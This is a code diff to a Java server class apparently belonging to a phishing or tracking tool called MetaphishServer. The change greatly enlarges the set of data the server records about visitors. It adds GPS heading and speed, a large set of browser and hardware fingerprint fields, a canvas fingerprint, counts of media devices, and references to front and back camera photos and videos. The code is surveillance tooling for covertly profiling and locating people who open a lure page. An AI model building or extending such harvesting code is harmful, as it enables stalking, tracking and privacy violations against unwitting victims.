@@ -169,12 +169,27 @@ public final class MetaphishServer {
         DeviceData.putAll(ProfileData);
         DeviceData.putAll(GeoData);
 
-        String[] Fields = {"GpsLatitude", "GpsLongitude", "GpsAccuracy", "GpsAltitude",
-                "BatteryLevel", "BatteryCharging", "ConnectionType", "EffectiveConnectionType",
-                "DownlinkMbps", "ScreenResolution", "PixelRatio", "Timezone", "Language",
-                "DeviceMemoryGb", "HardwareConcurrency", "MaxTouchPoints", "CookieEnabled",
-                "OnlineStatus", "PageUrl", "Referrer",
-                "CameraFrontFile", "CameraBackFile", "CameraVideoFile", "CameraVideoBackFile"};
+        String[] Fields = {
+                "GpsLatitude", "GpsLongitude", "GpsAccuracy", "GpsAltitude",
+                "GpsAltitudeAccuracy", "GpsHeading", "GpsSpeed",
+                "BatteryLevel", "BatteryCharging", "BatteryChargingTime", "BatteryDischargingTime",
+                "ConnectionType", "EffectiveConnectionType", "DownlinkMbps", "NetworkRtt", "SaveData",
+                "ScreenResolution", "ScreenAvailable", "ViewportSize", "ColorDepth", "PixelRatio",
+                "OrientationType", "OrientationAngle",
+                "Platform", "Language", "LanguagesSupported", "VendorName", "DoNotTrack",
+                "CookieEnabled", "OnlineStatus", "DeviceMemoryGb", "HardwareConcurrency",
+                "MaxTouchPoints", "PluginCount", "PdfViewerEnabled", "HistoryLength", "DocumentReadyState",
+                "ServiceWorkerSupported", "IndexedDbSupported", "WebAssemblySupported", "WebRtcSupported",
+                "GamepadApiSupported", "PaymentRequestSupported", "BluetoothAvailable", "UsbAvailable",
+                "SpeechSynthesisAvailable", "SpeechRecognitionAvailable", "NotificationPermission",
+                "WebGlSupported", "WebGl2Supported", "WebGlRenderer", "WebGlVendor",
+                "AudioContextSampleRate", "AudioContextChannelCount",
+                "CanvasFingerprint",
+                "VideoInputCount", "AudioInputCount", "AudioOutputCount",
+                "StorageQuotaMb", "StorageUsedMb",
+                "PageUrl", "Referrer", "Timezone",
+                "CameraFrontFile", "CameraBackFile", "CameraVideoFile", "CameraVideoBackFile"
+        };
 
         for (String Field : Fields) {
             DeviceData.put(Field, Payload.getOrDefault(Field, "Not Available"));
